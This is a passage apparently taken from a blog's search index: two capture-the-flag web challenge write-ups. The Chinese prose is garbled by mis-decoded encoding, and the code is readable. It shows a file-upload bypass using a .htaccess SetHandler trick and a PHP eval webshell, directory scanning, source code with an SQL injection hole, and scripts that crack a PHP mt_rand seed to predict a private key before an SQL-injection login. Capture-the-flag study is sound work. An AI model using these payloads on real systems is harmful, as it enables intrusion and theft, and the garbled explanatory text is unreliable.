<h3 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h3><p>æ”¹<code>Content-Type: image/png</code>ï¼Œç„¶åä¼ ä¸ª<code>.hatccess</code>ï¼Œå†…å®¹ä¸ºï¼š</p>
<p>SetHandler application/x-httpd-php</p>
<p>å†ä¼ ä¸ªå›¾ç‰‡é©¬è¿‡å»<code>1.jpg</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿æ¥å³å¯</p>
<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>ä½¿ç”¨dirsearch</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd Documents/dirsearch</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u <span class="string">&quot;url&quot;</span> -e *</span><br></pre></td></tr></table></figure>

<p>æ‰«ç›®å½•æ‰«åˆ°<a href="http://www.zip/">www.zip</a></p>
<p>æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶<span class="number">3</span>ç§’åè¿”å›ç™»å½•ç•Œé¢</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// genarate public_key</span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crisp<span class="string">r&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>

<p>éšæœºæ•°ç§å­é—®é¢˜ï¼Œç”¨è„šæœ¬å°†å…¬é’¥æ•´ç†æˆphp_mt_randçš„æ ¼å¼ï¼Œè„šæœ¬å¦‚ä¸‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">$str = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">$pos = strpos($randStr,$str[$i]);</span><br><span class="line">echo $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>è¿˜åŸæˆç§å­ä¸ºï¼š1775196155</p>
<p>æ¥ä¸‹æ¥è¿˜åŸå¯†é’¥å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        echo mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>).<span class="string">&quot;---&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">echo public_key();</span><br><span class="line">echo private_key();</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›login.html</p>
<p>è¾“å…¥ä¸‡èƒ½å¯†ç å’Œå¯†é’¥å’Œç”¨æˆ·åcrisprå³å¯ã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
</search>
